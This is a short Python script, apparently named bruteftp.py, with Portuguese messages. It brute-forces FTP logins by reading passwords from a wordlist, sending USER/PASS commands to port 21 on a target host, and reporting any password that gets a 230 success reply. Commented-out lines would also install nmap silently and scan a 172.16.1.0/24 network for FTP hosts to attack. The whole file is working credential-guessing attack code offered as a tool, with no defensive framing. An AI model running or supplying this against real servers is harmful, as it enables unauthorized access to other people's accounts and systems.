#!/usr/bin/python3
import socket,sys,re,os

if len(sys.argv) != 3:
	print("Modo de uso: python3 bruteftp.py 127.0.0 user")
#	print("Modo de uso: python3 bruteftp.py user")
	sys.exit()
#target = str(sys.argv[1]+'.')
user = sys.argv[2]
#passwd = sys.argv[2]
#print("Testando com user =",user," e senha =",passwd)
#try:
#	alvos = open('alvos')
#except FileNotFoundError:
#	os.system("apt install nmap -y 1>/dev/null 2>/dev/null")
#	os.system("nmap -sS -v -p 21,2121 --open 172.16.1.0/24 -oG hosts 1>/dev/null 2>/dev/null && cat hosts | grep 'Up' | cut -d' ' -f2 > alvos")
#	alvos = open('alvos')
list = open('pass.txt')
for word in list.readlines():
#for host in alvos.readlines():
	passwd = word.strip()
	print("Brute Force Attack In FTP ==>"+user+":"+passwd)
#	alvosc = host.strip()
#	print("Brute Force Attack In Host: "+alvosc)
	sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	if (sock.connect_ex((sys.argv[1],21))==0):
		sock.recv(1024)
		sock.sendall(b'USER '+user.encode('utf-8')+b'\r\n')
		sock.recv(1024)
		sock.sendall(b'PASS '+passwd.encode('utf-8')+b'\r\n')
		resp = sock.recv(1024)
		sock.sendall(b'QUIT\r\n')
		if re.search(b'230',resp):
#			print("[+] Host Autenticado <====> "+alvosc)
			print("[+] Usuario Autenticado ==>"+user+":"+passwd)
		sock.close()
	else:
#		sock.close()
#		continue
		break
